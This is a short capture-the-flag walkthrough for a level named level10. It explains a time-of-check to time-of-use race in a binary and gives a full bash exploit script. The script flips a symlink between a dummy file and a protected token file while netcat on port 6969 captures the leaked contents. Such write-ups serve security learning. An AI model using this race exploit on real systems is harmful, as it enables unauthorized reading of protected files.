We start once again by listing the files in the current directory:
```bash
ls
```
Output:
```bash
level10 token
```

We then copy the file to our machine using `scp`, and analyze the level10 executable using `ghidra`.

Looking through the code we notice that an `access` function is called on the file received as argument, but this file is "used" only later in the program.

This seems to be a **TOCTOU** (time-of-check to time-of-use) vulnerability, so let's exploit it.

We also see in the program that we need to listen to the **6969 port**.

Now let's create a script that will:
- Create a dummy file we have access to (`/tmp/file` with the content "data").
- Remove any existing symbolic link at `/tmp/link`
- Create a symbolic link at `/tmp/link` pointing to `/tmp/file`
- Start netcat to listen on port 6969 and redirect the output to `/tmp/output`
- Launch the `level10` binary with the symbolic link and the host address `127.0.0.1` as arguments
- In a loop, alternate the symbolic link `/tmp/link` between the `token` file (`/home/user/level10/token`) and `/tmp/file` 50 times
- Wait for the binary process to finish

Script:
```bash
#!/bin/bash

LINK="/tmp/link"
TARGET="/home/user/level10/token"
BINARY="/home/user/level10/level10"
OUTPUT="/tmp/output"

echo "data" > /tmp/file
rm -f $LINK
ln -s /tmp/file $LINK

nc -l 6969 > $OUTPUT &
NC_PID=$!
sleep 1

$BINARY $LINK 127.0.0.1 &
BINARY_PID=$!

for i in {1..50}; do
    ln -sf $TARGET $LINK
    ln -sf /tmp/file $LINK
done

wait $BINARY_PID
sleep 2

kill $NC_PID 2>/dev/null
cat $OUTPUT
```

And this way we get our next flag